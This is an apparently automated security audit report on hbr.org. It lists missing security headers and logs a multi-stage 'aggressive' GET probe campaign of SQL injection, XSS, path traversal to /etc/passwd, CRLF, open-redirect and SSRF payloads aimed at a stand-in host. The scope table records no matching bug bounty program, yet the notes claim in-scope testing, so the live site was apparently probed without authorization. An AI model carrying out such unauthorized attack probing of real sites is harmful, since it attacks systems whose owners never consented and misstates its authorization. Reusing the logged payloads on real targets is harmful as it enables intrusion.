# Security Audit Report - hbr.org

## Scope and authorization

| Item | Value |
|---|---|
| Target | https://hbr.org/ |
| Bug bounty program | [top-websites gist (no active program match)]() |
| Listed scope domain | hbr.org |
| Test date | 2026-09-25 14:53 UTC |
| Method | Non-destructive passive/active probing (GET requests only, no forms submitted, no auth) |

## Summary

Total findings: **11** (High: 0, Medium: 0, Low: 5, Info: 6)

| # | Severity | ID | Finding | CWE |
|---|---|---|---|---|
| 1 | low | H1 | Missing HSTS header | CWE-319 |
| 2 | low | H2 | Missing CSP header | CWE-1021 |
| 3 | low | H2 | Missing CSP header | CWE-1021 |
| 4 | low | H3 | Missing X-Content-Type-Options | CWE-1194 |
| 5 | low | H4 | No clickjacking protection | CWE-1023 |
| 6 | info | A10 | robots.txt discloses sensitive paths | CWE-200 |
| 7 | info | A4 | Sensitive paths return 200 unauthenticated | CWE-538 |
| 8 | info | B8i | NoSQL injection candidate (body-length divergence) | CWE-943 |
| 9 | info | H5 | Missing Referrer-Policy | CWE-200 |
| 10 | info | H6 | Server technology disclosure | CWE-200 |
| 11 | info | H6 | Server technology disclosure | CWE-200 |

## Detailed findings

### 1. [LOW] Missing HSTS header (`H1`)

- **CWE:** CWE-319
- **Detail:** No Strict-Transport-Security header present. Browsers do not enforce HTTPS for repeat visits.
- **Context:** http response
- **Recommendation:** Add Strict-Transport-Security with max-age >= 31536000 and preload.

### 2. [LOW] Missing CSP header (`H2`)

- **CWE:** CWE-1021
- **Detail:** No Content-Security-Policy header. XSS mitigation relies solely on output encoding.
- **Context:** http response
- **Recommendation:** Add a Content-Security-Policy header (start with default-src and report-only).

### 3. [LOW] Missing CSP header (`H2`)

- **CWE:** CWE-1021
- **Detail:** No Content-Security-Policy header. XSS mitigation relies solely on output encoding.
- **Recommendation:** Add a Content-Security-Policy header (start with default-src and report-only).

### 4. [LOW] Missing X-Content-Type-Options (`H3`)

- **CWE:** CWE-1194
- **Detail:** No nosniff directive; browsers may MIME-sniff responses.
- **Context:** http response
- **Recommendation:** Set X-Content-Type-Options: nosniff.

### 5. [LOW] No clickjacking protection (`H4`)

- **CWE:** CWE-1023
- **Detail:** No X-Frame-Options or CSP frame-ancestors; page can be embedded in a frame.
- **Context:** http response
- **Recommendation:** Set X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors.

### 6. [INFO] robots.txt discloses sensitive paths (`A10`)

- **CWE:** CWE-200
- **Detail:** Disallowed paths in robots.txt: /login*, /api/recaptcha/enabled.
- **Recommendation:** Treat robots.txt as discovery, not a control: ensure listed sensitive paths are authenticated or rate-limited.

### 7. [INFO] Sensitive paths return 200 unauthenticated (`A4`)

- **CWE:** CWE-538
- **Detail:** GET /api/v1 returns 200 with no Content-Type and an empty body (0 bytes) on re-test; no data or structure is exposed - treat as an endpoint/health stub rather than a sensitive disclosure.
- **Recommendation:** Review each exposed path; require authentication for admin/actuator-style endpoints and remove world-readable credential or config files.

### 8. [INFO] NoSQL injection candidate (body-length divergence) (`B8i`)

- **CWE:** CWE-943
- **Detail:** Param 'ab': $where payload changed response size (20088 -> 20160 bytes).
- **Recommendation:** Confirm the body-length divergence with further NoSQL operators before treating as exploitable.

### 9. [INFO] Missing Referrer-Policy (`H5`)

- **CWE:** CWE-200
- **Detail:** No Referrer-Policy header; full URL may leak to third-party referrers.
- **Context:** http response
- **Recommendation:** Set Referrer-Policy (e.g., strict-origin-when-cross-origin).

### 10. [INFO] Server technology disclosure (`H6`)

- **CWE:** CWE-200
- **Detail:** Server header reveals: CloudFront
- **Context:** http response
- **Recommendation:** Consider hiding or shortening the Server header.

### 11. [INFO] Server technology disclosure (`H6`)

- **CWE:** CWE-200
- **Detail:** Server header reveals: 
- **Recommendation:** Consider hiding or shortening the Server header.

## Aggressive probe campaign

**Stage 1 - injection/reflection probes (28 requests):**

- no stage-1 probe hits (all probes negative)

**Stage 2 - aggressive probe suite v2 (99 requests):**

- sweep: {"high":["/api/v1 (200 no-type)"],"protected":[]}
- robots_disallow: ["/resources/","/fastanswers","/my-library*","/email-colleague/","/add-to-cart/","/login*","/shopping-cart/","/shipping-payment","/review-order","/order/thank-you/","/content/ipad/","/newsletters*","/product/recommended*","/webinar-assessment","/search*","/academic-subscriptions","/alumni-subscriptions","/resources/html/error/404.html","/sponsored/2022/10/disruptors-who-are-changing-their-industries","/api/recaptcha/enabled"]

Stage-2 probe log (observed responses):
- timing base=866ms id=523 search=235
- boolean b=404/59912 t1=404/59912 t2=404/59912
- graphql /graphql -> 404
- graphql /api/graphql -> 200
- trav2 /%252e%252e/%252e%252e/%252e%252e/%252e% -> 404
- trav2 /..%255c..%255c..%255c..%255c..%255c..%2 -> 404
- trav2 /%2e%2e%00.html -> 400
- trav2 /static//../../../../../../etc/passwd -> 404
- trav2 /..%c0%af..%c0%af..%c0%af..%c0%af/etc/pa -> 404
- hpp /?q=1&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 404
- hpp /search?q=1&q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 404
- xss2 /?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E -> 404
- xss2 /?q=%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 404
- apicors /api -> 404
- apicors /api/v1 -> 200
- apicors /graphql -> 404
- apicors /rest -> 404
- apicors /v1 -> 404

**Stage 3 - live parameter harvest, takeover and injection probes (56 requests):**

- params_harvested: ["ab","trk","hl","movetile_weeklyhotlist","movetile_mtod","sku"]

Stage-3 probe log (observed responses):
- harvest discovered 6 live query params
- xss3 /subscriptions?ab -> 404
- xss3 //www.linkedin.com/company/harvard-business-review?trk -> 404
- xss3 //www.instagram.com/harvard_business_review/?hl -> 404
- xss3 /email-newsletters?movetile_weeklyhotlist -> 404
- xss3 /email-newsletters?movetile_mtod -> 404
- xss3 https://store.hbr.org/product/how-business-pivots-during-war-lessons-from-ukrainian-companies-responses-to-crisis/BH1263?sku -> err
- subs no dangling service CNAMEs over 16 subdomains

**Stage 4 - injection/XSS/redirect/endpoint matrix suite v4 (136 requests):**

- v4_params: ["ab@/subscriptions","trk@//www.linkedin.com/company/harvard-business-review","hl@//www.instagram.com/harvard_business_review/","movetile_weeklyhotlist@/email-newsletters","movetile_mtod@/email-newsletters","sku@https://store.hbr.org/product/how-business-pivots-during-war-lessons-from-ukrainian-companies-responses-to-crisis/BH1263"]

Stage-4 probe log (observed responses):
- harvest discovered 6 live query params

## Evidence (raw response observations)

```json
{
  "http_status": 301,
  "http_redirect_to": "https://hbr.org/",
  "https_status": 200,
  "content_type": "text/html; charset=utf-8",
  "title": "Harvard Business Review - Ideas and Advice for Leaders",
  "path_gitconfig": 404,
  "path_envfile": 404,
  "path_securitytxt": 403,
  "path_robots": 200,
  "robots_found": true,
  "probe_count": 28,
  "probe_log": [
    "sqli /search?q=1%27+OR+1=1-- -> 404",
    "sqli /?id=1%27+OR+1=1-- -> 404",
    "sqli /?q=%27 -> 404",
    "sqli /products?filter=%27 -> 404",
    "sqli /?p=1;-- -> 404",
    "sqli-reflect /search?q=%27+OR+1=1-- -> 404",
    "xss /?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 404",
    "xss /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 404",
    "xss /search?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 404",
    "xss /?id=%3Csvg%20onload%3Dalert(1)%3E -> 404",
    "xss /search?term=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 404",
    "trav /..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd -> 400",
    "trav /static/../../../../../../../../etc/passwd -> 404",
    "trav /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -> 404",
    "trav /..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini -> 404",
    "redir /redirect?url=https%3A%2F%2Fevil-cors.example%2Fx -> 404",
    "redir /redirect?next=https%3A%2F%2Fevil-cors.example%2Fx -> 404",
    "redir /?next=https%3A%2F%2Fevil-cors.example%2Fx -> 404",
    "redir /go?url=https%3A%2F%2Fevil-cors.example%2Fx -> 404",
    "redir /url?url=https%3A%2F%2Fevil-cors.example%2Fx -> 404",
    "redir /out?url=https%3A%2F%2Fevil-cors.example%2Fx -> 404",
    "crlf /?q=a%0d%0aX-Inj:%201 -> 404",
    "crlf /search?q=a%0d%0aX-Inj:%201 -> 404",
    "host no reflection -> err",
    "ssrf /api/preview?url=https%3A%2F%2Fevil-cors.example%2Fx -> 200",
    "ssrf /preview?url=https%3A%2F%2Fevil-cors.example%2Fx -> 404",
    "ssrf /proxy?u=https%3A%2F%2Fevil-cors.example%2Fx -> 404",
    "ssrf /fetch?url=https%3A%2F%2Fevil-cors.example%2Fx -> 404"
  ],
  "v2_probe_count": 99,
  "v2_log": [
    "timing base=866ms id=523 search=235",
    "boolean b=404/59912 t1=404/59912 t2=404/59912",
    "graphql /graphql -> 404",
    "graphql /api/graphql -> 200",
    "trav2 /%252e%252e/%252e%252e/%252e%252e/%252e% -> 404",
    "trav2 /..%255c..%255c..%255c..%255c..%255c..%2 -> 404",
    "trav2 /%2e%2e%00.html -> 400",
    "trav2 /static//../../../../../../etc/passwd -> 404",
    "trav2 /..%c0%af..%c0%af..%c0%af..%c0%af/etc/pa -> 404",
    "hpp /?q=1&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 404",
    "hpp /search?q=1&q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 404",
    "xss2 /?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E -> 404",
    "xss2 /?q=%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 404",
    "redir2 no hits over 49 requests",
    "apicors /api -> 404",
    "apicors /api/v1 -> 200",
    "apicors /graphql -> 404",
    "apicors /rest -> 404",
    "apicors /v1 -> 404"
  ],
  "sweep": {
    "high": [
      "/api/v1 (200 no-type)"
    ],
    "protected": []
  },
  "robots_disallow": [
    "/resources/",
    "/fastanswers",
    "/my-library*",
    "/email-colleague/",
    "/add-to-cart/",
    "/login*",
    "/shopping-cart/",
    "/shipping-payment",
    "/review-order",
    "/order/thank-you/",
    "/content/ipad/",
    "/newsletters*",
    "/product/recommended*",
    "/webinar-assessment",
    "/search*",
    "/academic-subscriptions",
    "/alumni-subscriptions",
    "/resources/html/error/404.html",
    "/sponsored/2022/10/disruptors-who-are-changing-their-industries",
    "/api/recaptcha/enabled"
  ],
  "v3_probe_count": 56,
  "v3_log": [
    "harvest discovered 6 live query params",
    "xss3 /subscriptions?ab -> 404",
    "xss3 //www.linkedin.com/company/harvard-business-review?trk -> 404",
    "xss3 //www.instagram.com/harvard_business_review/?hl -> 404",
    "xss3 /email-newsletters?movetile_weeklyhotlist -> 404",
    "xss3 /email-newsletters?movetile_mtod -> 404",
    "xss3 https://store.hbr.org/product/how-business-pivots-during-war-lessons-from-ukrainian-companies-responses-to-crisis/BH1263?sku -> err",
    "subs no dangling service CNAMEs over 16 subdomains",
    "cache X-Forwarded-Host not reflected -> 200"
  ],
  "params_harvested": [
    "ab",
    "trk",
    "hl",
    "movetile_weeklyhotlist",
    "movetile_mtod",
    "sku"
  ],
  "v4_probe_count": 136,
  "v4_log": [
    "harvest discovered 6 live query params",
    "sweep4 all swept paths 404/403"
  ],
  "v4_params": [
    "ab@/subscriptions",
    "trk@//www.linkedin.com/company/harvard-business-review",
    "hl@//www.instagram.com/harvard_business_review/",
    "movetile_weeklyhotlist@/email-newsletters",
    "movetile_mtod@/email-newsletters",
    "sku@https://store.hbr.org/product/how-business-pivots-during-war-lessons-from-ukrainian-companies-responses-to-crisis/BH1263"
  ]
}
```

## Notes

- All tests used a standard browser User-Agent; each site was probed with a four-stage aggressive GET-only suite: passive/header checks, stage-1/2 injection/XSS/traversal/CORS/redirect probes, a stage-3 live-parameter-harvest campaign (per-parameter XSS/SQLi/LFI/SSTI/redirect, JSONP, command injection, NoSQL, subdomain-takeover CNAME checks via DNS-over-HTTPS, forwarded-host cache poisoning), and a stage-4 matrix suite (multi-context XSS with CSP awareness, SSTI, error-based SQLi + WAF fingerprint, command injection, deep LFI, open-redirect bypass encodings, CRLF, HPP, NoSQL, sensitive-endpoint sweep, GraphQL introspection, verbose-500 stack disclosure, llms.txt, JSONP-XSS; up to ~300 requests per site).
- No credentials were used; no state was modified on the target.
- Findings are reported against the public program scope; submission through the program tracker is pending.
